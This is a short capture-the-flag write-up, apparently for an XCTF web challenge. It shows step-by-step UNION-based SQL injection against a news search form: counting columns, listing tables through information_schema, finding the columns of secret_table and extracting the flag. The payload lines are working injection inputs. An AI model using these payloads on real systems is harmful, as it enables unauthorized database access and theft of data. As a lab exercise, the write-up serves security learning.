https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=4686&page=1

<img width="1166" alt="Hacker News" src="https://user-images.githubusercontent.com/48151790/126885975-3ece1c3c-5122-4c53-acc3-b0112fb03eba.png">

. Try with SQLi?

  . find the columns number in the table: 
  
    Try: ’ union select 1,2;
    
  <img width="850" alt="This page Isn't working" src="https://user-images.githubusercontent.com/48151790/126886033-b6870608-0e4e-43cc-9d92-01910aa7eaa0.png">

    Try: ' union select 1,2,3;
    
  <img width="601" alt="111 200 241 24460604" src="https://user-images.githubusercontent.com/48151790/126886038-244a2c6a-da3a-49bf-8f47-b46a39950081.png">

  => there are 3 columns.
  
  . find the table name with infomation_schema:
  
  'union select 1,2, table_name from information_schema.tables;
  
  <img width="758" alt="A No Secure  111 200 241 24460604" src="https://user-images.githubusercontent.com/48151790/126886068-7a1cf050-ae2c-444b-998a-4e78a72abe5e.png">

  . secret_table looks questionable???
  
  <img width="889" alt="Screen Shot 2021-07-23 at 10 48 13" src="https://user-images.githubusercontent.com/48151790/126886098-c4658f05-e779-45f3-b0c3-9cfef1671169.png">

  . find data types and columns name of table:
  
  'union select 1,column_type,column_name from information_schema.columns where table_name='secret_table';
  
  <img width="875" alt="Search news" src="https://user-images.githubusercontent.com/48151790/126886170-6f5bc804-c163-456d-a00d-98cd5bb40911.png">

  => get flag in secret_table:
  
  'union select 1,2,fl4g from secret_table;
  
  <img width="871" alt="Search news" src="https://user-images.githubusercontent.com/48151790/126886179-4ceaa256-15d1-4949-b31b-20db49966d2e.png">
